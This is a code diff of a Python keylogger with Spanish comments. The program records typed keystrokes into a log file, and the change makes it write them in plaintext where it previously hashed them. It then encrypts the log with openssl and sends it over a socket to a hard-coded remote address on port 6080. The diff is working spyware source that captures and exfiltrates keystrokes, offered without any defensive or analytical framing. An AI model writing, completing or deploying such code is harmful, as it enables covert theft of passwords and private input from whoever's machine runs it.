@@ -18,19 +18,16 @@ def enviarArchivo(sck: socket.socket, archivo):
         while read_bytes := f.read(1024):
             sck.sendall(read_bytes)
 def crearConexion():
-    #CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ~/Desktop/.keylogger>
-    #subprocess.call(CMD, shell=True)
-    #time.sleep(2)
     try:
         with socket.create_connection(("192.168.1.83", 6080)) as conn:
+            CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ~/Desktop/.keylogger/public.pem -pubin"
+            pipe=subprocess.Popen(CMD, shell=True)
+            pipe.wait()
             enviarArchivo(conn, "file2.log")
     except:
         with open(archivo, 'a') as f:
             mensaje ="**** El socket no se puede conectar ****"
-            sha512= hashlib.sha512()
-            sha512.update(mensaje.encode('utf-8'))
-            res = sha512.hexdigest()
-            f.write(res)
+            f.write(mensaje)
             f.write('\n')
 # Guardamos lo que se va escribiendo antes de presionar espacio o enter
 listaCadena =  []
@@ -53,10 +50,7 @@ def OnKeyPress(event):
     if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key:
         with open(archivo, 'a') as f:
             mensaje = "".join(listaCadena)
-            sha512= hashlib.sha512()
-            sha512.update(mensaje.encode('utf-8'))
-            res = sha512.hexdigest()
-            f.write(res)
+            f.write(mensaje)
             f.write('\n')
             listaCadena.clear()
 
